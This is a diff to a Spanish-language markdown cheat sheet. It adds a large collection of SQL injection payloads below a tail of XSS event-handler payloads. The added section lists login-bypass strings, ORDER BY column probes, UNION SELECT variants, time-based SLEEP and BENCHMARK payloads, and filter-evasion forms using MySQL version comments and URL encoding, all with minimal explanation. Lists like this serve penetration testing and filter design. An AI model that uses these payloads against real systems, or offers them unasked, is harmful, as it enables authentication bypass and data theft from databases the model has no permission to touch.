@@ -189,3 +189,206 @@ Muchos mas:
 <body onMouseOver body onMouseOver="javascript:javascript:alert(1)"></body onMouseOver> 
 <body onUnload body onUnload="javascript:javascript:alert(1)">
 ```
+
+
+
+
+# sql injection 
+
+## Payloads para sql inyection login bypass
+
+```
+' or ''-'
+" or ""-"
+" or true--
+' or true--
+admin' --
+admin' #
+admin'/*
+admin' or '1'='1
+admin' or '1'='1'--
+admin' or '1'='1'#
+admin'or 1=1 or ''='
+admin' or 1=1
+admin' or 1=1--
+admin' or 1=1#
+admin' or 1=1/*
+admin") or ("1"="1
+admin") or ("1"="1"--
+admin") or ("1"="1"#
+admin") or ("1"="1"/*
+admin") or "1"="1
+admin") or "1"="1"--
+admin") or "1"="1"#
+admin") or "1"="1"/*
+```
+
+## Ejemplos de payloads sql injection
+
+### Detectar un error sql 
+```
+' = %27
+" = %22
+# = %23
+; = %3B
+```
+
+### Detectar numero de columnas vulnerables 
+```
+ ORDER BY 1-- 
+ ORDER BY 2-- 
+ ORDER BY 3-- 
+ ORDER BY 4-- 
+ ORDER BY 5-- 
+ ORDER BY 6-- 
+ ORDER BY 7-- 
+ ORDER BY 8-- 
+ ORDER BY 9-- 
+ ORDER BY 10-- 
+ 
+ ORDER BY 1# 
+ ORDER BY 2# 
+ ORDER BY 3# 
+ ORDER BY 4# 
+ ORDER BY 5# 
+ ORDER BY 6# 
+ ORDER BY 7# 
+ ORDER BY 8# 
+ ORDER BY 9# 
+ ORDER BY 10# 
+
+```
+
+### Union Select Payloads
+
+```
+ UNION SELECT 1
+ UNION SELECT 1,2
+ UNION SELECT 1,2,3
+ UNION SELECT 1,2,3,4
+ UNION SELECT 1,2,3,4,5
+ UNION SELECT 1,2,3,4,5,6
+ UNION SELECT 1,2,3,4,5,6,7
+
+ UNION ALL SELECT 1
+ UNION ALL SELECT 1,2
+ UNION ALL SELECT 1,2,3
+ UNION ALL SELECT 1,2,3,4
+ UNION ALL SELECT 1,2,3,4,5
+ UNION ALL SELECT 1,2,3,4,5,6
+ UNION ALL SELECT 1,2,3,4,5,6,7
+ 
+ UNION(SELECT 1)
+ UNION(SELECT 1,2)
+ UNION(SELECT 1,2,3)
+ UNION(SELECT 1,2,3,4)
+ UNION(SELECT 1,2,3,4,5)
+ UNION(SELECT 1,2,3,4,5,6)
+ UNION(SELECT 1,2,3,4,5,6,7)
+ 
+ UNION ALL(SELECT 1)
+ UNION ALL(SELECT 1,2)
+ UNION ALL(SELECT 1,2,3)
+ UNION ALL(SELECT 1,2,3,4)
+ UNION ALL(SELECT 1,2,3,4,5)
+ UNION ALL(SELECT 1,2,3,4,5,6)
+ UNION ALL(SELECT 1,2,3,4,5,6,7)
+ 
+ AND 1 UNION SELECT 1
+ AND 1 UNION SELECT 1,2
+ AND 1 UNION SELECT 1,2,3
+ AND 1 UNION SELECT 1,2,3,4
+ AND 1 UNION SELECT 1,2,3,4,5
+ AND 1 UNION SELECT 1,2,3,4,5,6
+ AND 1 UNION SELECT 1,2,3,4,5,6,7
+
+
+```
+
+### Union Select + sleep() + BENCHMARK(1000000,MD5('A')) Payloads
+
+```
+ UNION SELECT @@VERSION,SLEEP(5),3
+ UNION SELECT @@VERSION,SLEEP(5),USER(),4
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8
+ 
+```
+
+### tecnicas para hacer bypass en sql inyection 
+
+#### bypass usando comentarios
+```
+ /*!UNION*/ /*!SELECT*/ 1
+ /*!UNION*/ /*!SELECT*/ 1,2
+ /*!UNION*/ /*!SELECT*/ 1,2,3
+ /*!UNION*/ /*!SELECT*/ 1,2,3,4
+ /*!UNION*/ /*!SELECT*/ 1,2,3,4,5
+ /*!UNION*/ /*!SELECT*/ 1,2,3,4,5,6
+ /*!UNION*/ /*!SELECT*/ 1,2,3,4,5,6,7
+ 
+ /*!12345UNION*/ /*!12345SELECT*/ 1
+ /*!12345UNION*/ /*!12345SELECT*/ 1,2
+ /*!12345UNION*/ /*!12345SELECT*/ 1,2,3
+ /*!12345UNION*/ /*!12345SELECT*/ 1,2,3,4
+ /*!12345UNION*/ /*!12345SELECT*/ 1,2,3,4,5
+ /*!12345UNION*/ /*!12345SELECT*/ 1,2,3,4,5,6
+ /*!12345UNION*/ /*!12345SELECT*/ 1,2,3,4,5,6,7
+ 
+ /*!12345UNION*/(/*!12345SELECT*/ 1)
+ /*!12345UNION*/(/*!12345SELECT*/ 1,2)
+ /*!12345UNION*/(/*!12345SELECT*/ 1,2,3)
+ /*!12345UNION*/(/*!12345SELECT*/ 1,2,3,4)
+ /*!12345UNION*/(/*!12345SELECT*/ 1,2,3,4,5)
+ /*!12345UNION*/(/*!12345SELECT*/ 1,2,3,4,5,6)
+ /*!12345UNION*/(/*!12345SELECT*/ 1,2,3,4,5,6,7)
+
+```
+#### bypass usando comentarios + url encoding 
+```
+ /*!%55nion*/%20/*!%53elect*/1
+ /*!%55nion*/%20/*!%53elect*/%201,2
+ /*!%55nion*/%20/*!%53elect*/%201,2,3
+ /*!%55nion*/%20/*!%53elect*/%201,2,3,4
+ /*!%55nion*/%20/*!%53elect*/%201,2,3,4,5
+ /*!%55nion*/%20/*!%53elect*/%201,2,3,4,5,6
+ /*!%55nion*/%20/*!%53elect*/%201,2,3,4,5,6,7
+ 
+ /*!12345%55nion*/ /*!12345%53elect*/ 1
+ /*!12345%55nion*/ /*!12345%53elect*/ 1,2
+ /*!1234%55nion*/ /*!12345%53elect*/ 1,2,3
+ /*!12345%55nion*/ /*!12345%53elect*/ 1,2,3,4
+ /*!12345%55nion*/ /*!12345%53elect*/ 1,2,3,4,5
+ /*!12345%55nion*/ /*!12345%53elect*/ 1,2,3,4,5,6
+ /*!12345%55nion*/ /*!12345%53elect*/ 1,2,3,4,5,6,7
+ 
+ /*!12345%55nion*/(/*!12345%53elect*/ 1)
+ /*!12345%55nion*/(/*!12345%53elect*/ 1,2)
+ /*!12345%55nion*/(/*!12345%53elect*/ 1,2,3)
+ /*!12345%55nion*/(/*!12345%53elect*/ 1,2,3,4)
+ /*!12345%55nion*/(/*!12345%53elect*/ 1,2,3,4,5)
+ /*!12345%55nion*/(/*!12345%53elect*/ 1,2,3,4,5,6)
+ /*!12345%55nion*/(/*!12345%53elect*/ 1,2,3,4,5,6,7)
+
+```
+
+### HTML URL Encode (Codificación Url)
+
+```
+union select:
+
+u	= %75
+n	= %6e
+i	= %69
+o	= %6f
+n	= %6e
+space	= %20
+s	= %73
+e	= %65
+l	= %6c
+c	= %63
+t	= %74
+
+```
